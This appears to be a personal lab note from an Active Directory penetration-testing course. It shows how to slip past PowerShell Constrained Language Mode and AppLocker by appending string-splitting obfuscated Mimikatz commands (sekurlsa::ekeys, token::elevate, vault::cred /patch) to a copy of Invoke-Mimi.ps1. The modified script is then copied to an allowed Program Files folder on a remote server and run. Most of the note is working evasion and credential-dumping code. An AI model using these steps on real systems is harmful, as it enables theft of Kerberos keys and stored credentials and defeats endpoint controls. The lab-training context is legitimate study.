View constrained language type
```powershell
$ExecutionContext.SessionState.LanguageMode
```

View Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Default rules are to allow **Everyone** to access and run scripts from `C:\Program Files` and `C:\Windows`
![[Pasted image 20250506212949.png]]

In the `Constrained Language Mode`, we can't run scripts using dot sourcing (`. .\Invoke-Mimi.ps1`). So, we must modify `Invoke-Mimi.ps1 `to include the 
function call in the script itself and transfer the modified script (`Invoke-MimiEx.ps1`) to the target server.

Create `Invoke-MimiEx-keys.ps1`
- Create a copy of Invoke-Mimi.ps1 and rename it to `Invoke-MimiEx-keys.ps1`
- Open `Invoke-MimiEx-keys.ps1 `in PowerShell ISE (Right click on it and click Edit). 
- Add the below encoded value for "sekurlsa::ekeys" to the end of the file

```powershell
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + 
$1 ;
Invoke-Mimi -Command $Pwn
```

Same thing for Credential Vault
```powershell
$a1 = "t"
$a2 = "o"
$a3 = "k"
$a4 = "e"
$a5 = "n"
$a6 = ":"
$a7 = ":"
$a8 = "e"
$a9 = "l"
$a10 = "v"
$a11 = "a"
$a12 = "t"
$a13 = "e"

$b1 = "v"
$b2 = "a"
$b3 = "u"
$b4 = "l"
$b5 = "t"
$b6 = ":"
$b7 = ":"
$b8 = "c"
$b9 = "r"
$b10 = "e"
$b11 = "d"
$b12 = " "
$b13 = "/"
$b14 = "p"
$b15 = "a"
$b16 = "t"
$b17 = "c"
$b18 = "h"

# Build first command: token::elevate
$cmd1 = $a1 + $a2 + $a3 + $a4 + $a5 + $a6 + $a7 + $a8 + $a9 + $a8 + $a10 + $a11 + $a12 + $a4

# Build second command: vault::cred /patch
$cmd2 = $b1 + $b2 + $b3 + $b4 + $b5 + $b6 + $b7 + $b8 + $b9 + $b10 + $b11 + $b12 + $b13 + $b14 + $b15 + $b16 + $b17 + $b18

# Run them
Invoke-Mimi -Command $cmd1 $cmd2
```

Copy to machine and run
```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

.\Invoke-MimiEx-keys.ps1
.\Invoke-MimiEx-vault.ps1
```